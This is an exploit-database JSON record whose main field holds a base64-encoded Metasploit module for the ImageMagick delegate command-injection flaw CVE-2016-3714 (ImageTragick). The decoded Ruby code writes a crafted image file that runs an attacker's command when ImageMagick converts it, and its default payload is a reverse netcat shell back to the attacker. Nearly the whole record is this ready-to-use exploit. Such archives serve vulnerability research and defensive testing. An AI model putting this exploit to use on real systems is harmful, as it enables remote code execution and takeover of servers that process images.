{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cDovL21ldGFzcGxvaXQuY29tL2Rvd25sb2FkDQojIEN1cnJlbnQgc291cmNlOiBodHRwczovL2dpdGh1Yi5jb20vcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrDQojIw0KDQpjbGFzcyBNZXRhc3Bsb2l0TW9kdWxlIDwgTXNmOjpFeHBsb2l0DQoNCiAgUmFuayA9IEV4Y2VsbGVudFJhbmtpbmcNCg0KICBpbmNsdWRlIE1zZjo6RXhwbG9pdDo6RklMRUZPUk1BVA0KDQogIGRlZiBpbml0aWFsaXplKGluZm8gPSB7fSkNCiAgICBzdXBlcih1cGRhdGVfaW5mbyhpbmZvLA0KICAgICAgJ05hbWUnICAgICAgICAgICAgPT4gJ0ltYWdlTWFnaWNrIERlbGVnYXRlIEFyYml0cmFyeSBDb21tYW5kIEV4ZWN1dGlvbicsDQogICAgICAnRGVzY3JpcHRpb24nICAgICA9PiAlcXsNCiAgICAgICAgVGhpcyBtb2R1bGUgZXhwbG9pdHMgYSBzaGVsbCBjb21tYW5kIGluamVjdGlvbiBpbiB0aGUgd2F5ICJkZWxlZ2F0ZXMiDQogICAgICAgIChjb21tYW5kcyBmb3IgY29udmVydGluZyBmaWxlcykgYXJlIHByb2Nlc3NlZCBpbiBJbWFnZU1hZ2ljayB2ZXJzaW9ucw0KICAgICAgICA8PSA3LjAuMS0wIGFuZCA8PSA2LjkuMy05IChsZWdhY3kpLg0KDQogICAgICAgIFNpbmNlIEltYWdlTWFnaWNrIHVzZXMgZmlsZSBtYWdpYyB0byBkZXRlY3QgZmlsZSBmb3JtYXQsIHlvdSBjYW4gY3JlYXRlDQogICAgICAgIGEgLnBuZyAoZm9yIGV4YW1wbGUpIHdoaWNoIGlzIGFjdHVhbGx5IGEgY3JhZnRlZCBTVkcgKGZvciBleGFtcGxlKSB0aGF0DQogICAgICAgIHRyaWdnZXJzIHRoZSBjb21tYW5kIGluamVjdGlvbi4NCg0KICAgICAgICBUZXN0ZWQgb24gTGludXgsIEJTRCwgYW5kIE9TIFguIFlvdSdsbCB3YW50IHRvIGNob29zZSB5b3VyIHBheWxvYWQNCiAgICAgICAgY2FyZWZ1bGx5IGR1ZSB0byBwb3J0YWJpbGl0eSBjb25jZXJucy4gVXNlIGNtZC91bml4L2dlbmVyaWMgaWYgbmVlZCBiZS4NCiAgICAgIH0sDQogICAgICAnQXV0aG9yJyAgICAgICAgICA9PiBbDQogICAgICAgICdzdGV3aWUnLCAgICAgICAgICAgICMgVnVsbmVyYWJpbGl0eSBkaXNjb3ZlcnkNCiAgICAgICAgJ05pa29sYXkgRXJtaXNoa2luJywgIyBWdWxuZXJhYmlsaXR5IGRpc2NvdmVyeQ0KICAgICAgICAnd3Z1JywgICAgICAgICAgICAgICAjIE1ldGFzcGxvaXQgbW9kdWxlDQogICAgICAgICdoZG0nICAgICAgICAgICAgICAgICMgTWV0YXNwbG9pdCBtb2R1bGUNCiAgICAgIF0sDQogICAgICAnUmVmZXJlbmNlcycgICAgICA9PiBbDQogICAgICAgICV3e0NWRSAyMDE2LTM3MTR9LA0KICAgICAgICAld3tVUkwgaHR0cHM6Ly9pbWFnZXRyYWdpY2suY29tL30sDQogICAgICAgICV3e1VSTCBodHRwOi8vc2VjbGlzdHMub3JnL29zcy1zZWMvMjAxNi9xMi8yMDV9LA0KICAgICAgICAld3tVUkwgaHR0cHM6Ly9naXRodWIuY29tL0ltYWdlTWFnaWNrL0ltYWdlTWFnaWNrL2NvbW1pdC8wNmM0MWFifSwNCiAgICAgICAgJXd7VVJMIGh0dHBzOi8vZ2l0aHViLmNvbS9JbWFnZU1hZ2ljay9JbWFnZU1hZ2ljay9jb21taXQvYTM0NzQ1Nn0NCiAgICAgIF0sDQogICAgICAnRGlzY2xvc3VyZURhdGUnICA9PiAnTWF5IDMgMjAxNicsDQogICAgICAnTGljZW5zZScgICAgICAgICA9PiBNU0ZfTElDRU5TRSwNCiAgICAgICdQbGF0Zm9ybScgICAgICAgID0+ICd1bml4JywNCiAgICAgICdBcmNoJyAgICAgICAgICAgID0+IEFSQ0hfQ01ELA0KICAgICAgJ1ByaXZpbGVnZWQnICAgICAgPT4gZmFsc2UsDQogICAgICAnUGF5bG9hZCcgICAgICAgICA9PiB7DQogICAgICAgICdCYWRDaGFycycgICAgICA9PiAiXHgyMlx4MjdceDVjIiwgIyAiLCAnLCBhbmQgXA0KICAgICAgICAnQ29tcGF0JyAgICAgICAgPT4gew0KICAgICAgICAgICdQYXlsb2FkVHlwZScgPT4gJ2NtZCBjbWRfYmFzaCcsDQogICAgICAgICAgJ1JlcXVpcmVkQ21kJyA9PiAnZ2VuZXJpYyBuZXRjYXQgYmFzaC10Y3AnDQogICAgICAgIH0NCiAgICAgIH0sDQogICAgICAnVGFyZ2V0cycgICAgICAgICA9PiBbDQogICAgICAgIFsnU1ZHIGZpbGUnLCAgdGVtcGxhdGU6ICdtc2Yuc3ZnJ10sICMgY29udmVydCBtc2YucG5nIG1zZi5zdmcNCiAgICAgICAgWydNVkcgZmlsZScsICB0ZW1wbGF0ZTogJ21zZi5tdmcnXSwgIyBjb252ZXJ0IG1zZi5zdmcgbXNmLm12Zw0KICAgICAgICBbJ01JRkYgZmlsZScsIHRlbXBsYXRlOiAnbXNmLm1pZmYnXSAjIGNvbnZlcnQgLWxhYmVsICIiIG1zZi5zdmcgbXNmLm1pZmYNCiAgICAgIF0sDQogICAgICAnRGVmYXVsdFRhcmdldCcgICA9PiAwLA0KICAgICAgJ0RlZmF1bHRPcHRpb25zJyAgPT4gew0KICAgICAgICAnUEFZTE9BRCcgICAgICAgICAgICAgICA9PiAnY21kL3VuaXgvcmV2ZXJzZV9uZXRjYXQnLA0KICAgICAgICAnTEhPU1QnICAgICAgICAgICAgICAgICA9PiBSZXg6OlNvY2tldC5zb3VyY2VfYWRkcmVzcywNCiAgICAgICAgJ0Rpc2FibGVQYXlsb2FkSGFuZGxlcicgPT4gZmFsc2UsDQogICAgICAgICdXZnNEZWxheScgICAgICAgICAgICAgID0+IDkwMDENCiAgICAgIH0NCiAgICApKQ0KDQogICAgcmVnaXN0ZXJfb3B0aW9ucyhbDQogICAgICBPcHRTdHJpbmcubmV3KCdGSUxFTkFNRScsIFt0cnVlLCAnT3V0cHV0IGZpbGUnLCAnbXNmLnBuZyddKQ0KICAgIF0pDQogIGVuZA0KDQogIGRlZiBleHBsb2l0DQogICAgaWYgdGFyZ2V0Lm5hbWUgPT0gJ1NWRyBmaWxlJw0KICAgICAgcCA9IFJleDo6VGV4dC5odG1sX2VuY29kZShwYXlsb2FkLmVuY29kZWQpDQogICAgZWxzZQ0KICAgICAgcCA9IHBheWxvYWQuZW5jb2RlZA0KICAgIGVuZA0KDQogICAgZmlsZV9jcmVhdGUodGVtcGxhdGUuc3ViKCdlY2hvIHZ1bG5lcmFibGUnLCBwKSkNCiAgZW5kDQoNCiAgZGVmIHRlbXBsYXRlDQogICAgRmlsZS5yZWFkKEZpbGUuam9pbigNCiAgICAgIE1zZjo6Q29uZmlnLmRhdGFfZGlyZWN0b3J5LCAnZXhwbG9pdHMnLCAnQ1ZFLTIwMTYtMzcxNCcsIHRhcmdldFs6dGVtcGxhdGVdDQogICAgKSkNCiAgZW5kDQoNCmVuZA==", 
    "filename": "platforms/multiple/local/39791.rb", 
    "id": "39791", 
    "cves": [
        "CVE-2016-3714"
    ]
}